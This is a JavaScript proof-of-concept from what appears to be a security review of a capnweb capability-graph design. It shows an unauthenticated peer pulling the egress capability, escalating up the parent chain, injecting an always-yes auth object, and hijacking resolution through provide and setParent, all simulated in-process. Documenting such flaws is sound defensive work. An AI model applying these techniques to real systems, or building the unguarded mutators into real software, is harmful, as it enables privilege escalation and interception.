// RED-TEAM PoC (security review). Reuses the spike's OWN graph + transport to show that a
// remote peer handed the `project` host over capnweb owns the whole authority chain with NO auth.
//
//   run:  node redteam-poc.mjs
//
// Mirrors gateway.mjs `/api`, which returns `projectHost(env)` as the capnweb main. The "client"
// here is the untrusted party (a browser / another account / untrusted project code) that opened
// /api. It never authenticates. We show 4 attacks land.

import { RpcSession, RpcTarget } from "capnweb";
import { makeLinkedPair } from "./inproc.mjs";
import { buildGraph } from "./graph.mjs";

const line = (s) => console.log(s);
let fails = 0;
const check = (label, cond, detail = "") => {
  line(`${cond ? "  ATTACK LANDS " : "  blocked     "} ${label}${detail ? "  — " + detail : ""}`);
  if (!cond) fails++;
};

// SERVER SIDE: exactly what gateway.mjs /api exposes — the project host as the capnweb main.
// (Fresh graph, but the DESIGN's plan is ONE shared capability-host DO — see report theory #1.)
const { project } = buildGraph({
  egressFetch: async (url) => ({ status: 200, body: `SECRET-egress-result for ${url}` }),
});

// CLIENT SIDE: an unauthenticated remote peer. It only has the wire.
const wire = makeLinkedPair({ name: "attacker<->/api" });
new RpcSession(wire.right, project); // server: hands out the project host, no auth gate
const remote = new RpcSession(wire.left, null).getRemoteMain(); // attacker's stub to `project`

line("\n=== Attacker holds ONLY an unauthenticated stub to the project host ===");

// ── ATTACK 1: pull the raw CP egress capability by NAME (not merely call through it). ──────────
// resolve() is a public method; fallthrough climbs project→control-plane and returns the STUB.
try {
  const egressStub = await remote.resolve("egress");
  const r = await egressStub.fetch("https://victim.internal/exfil");
  check(
    "1. resolve('egress') hands back the control-plane's egress stub",
    r?.via === "control-plane egress",
    JSON.stringify(r),
  );
} catch (e) {
  check("1. resolve('egress')", false, String(e));
}

// ── ATTACK 2: reach a capability mounted TWO layers up (iterate), from the bottom of the chain. ─
// Privilege escalation up the parent chain: project has no iterate; CP has it; attacker resolves it.
try {
  const flavor = await remote.iterate.flavor.flavorPrompt("assistant"); // property access → server resolve()
  const brand = await remote.resolve("iterate"); // and the mounted host itself
  const brandName = await brand.resolve("brandName");
  check(
    "2. bottom layer resolves iterate.* mounted 2 layers up",
    flavor.includes("iterate-flavoured") && brandName === "iterate",
    JSON.stringify({ flavor, brandName }),
  );
} catch (e) {
  check("2. reach iterate two layers up", false, String(e));
}

// ── ATTACK 3: the mutators setParent/provide are PUBLIC + UNAUTHENTICATED over the wire. ──────────
// A remote peer can call them with no credential. We prove they are callable (return true).
class EvilAuth extends RpcTarget {
  async gate() {
    return { member: true, role: "owner", actor: "attacker" };
  } // always-yes auth
}
const evilAuth = new EvilAuth(); // keep a live ref so capnweb doesn't dispose our param
try {
  const ok = await remote.provide("auth", evilAuth, "live"); // shadow a cap the host will serve
  check(
    "3. provide('auth', always-yes) is callable UNAUTHENTICATED over RPC",
    ok === true,
    "returned " + ok,
  );
} catch (e) {
  check("3. provide() unauthenticated", false, String(e));
}
try {
  const ok = await remote.setParent(evilAuth); // redirect the fallthrough target
  check(
    "3b. setParent(attacker) is callable UNAUTHENTICATED over RPC",
    ok === true,
    "returned " + ok,
  );
} catch (e) {
  check("3b. setParent() unauthenticated", false, String(e));
}

// ── ATTACK 4: SEMANTICS of shadow + redirect, proven in-process (no wire lifetime noise). ────────
// Same host class the server runs; shows the mutations actually change resolution.
{
  const { project: p2, controlPlane } = buildGraph();
  // 4a shadow: local mount beats the parent's real egress.
  p2.provide(
    "egress",
    new (class extends RpcTarget {
      async fetch() {
        return { via: "ATTACKER-shadowed egress", status: 200, body: "phished" };
      }
    })(),
    "live",
  );
  const shadowed = await p2.resolve("egress").fetch("https://bank.example/transfer");
  check(
    "4a. provide() shadows the parent's egress (local mount wins)",
    shadowed.via === "ATTACKER-shadowed egress",
    JSON.stringify(shadowed),
  );

  // 4b redirect: setParent swings the WHOLE fallthrough to an attacker host — MITM of every miss.
  const evilCp = new (class extends RpcTarget {
    resolve() {
      return new (class extends RpcTarget {
        async fetch() {
          return { via: "MITM parent", status: 200, body: "x" };
        }
      })();
    }
  })();
  const p3 = buildGraph().project;
  p3.setParent(evilCp);
  const mitm = await p3.resolve("egress").fetch("https://bank.example/transfer");
  check(
    "4b. setParent() MITMs every unresolved capability",
    mitm.via === "MITM parent",
    JSON.stringify(mitm),
  );
  void controlPlane;
}

line("\n" + "=".repeat(64));
line(
  fails
    ? `Some attacks were blocked (${fails}).`
    : "ALL 4 ATTACKS LANDED against an unauthenticated stub. Design is wide open.",
);
process.exit(0);
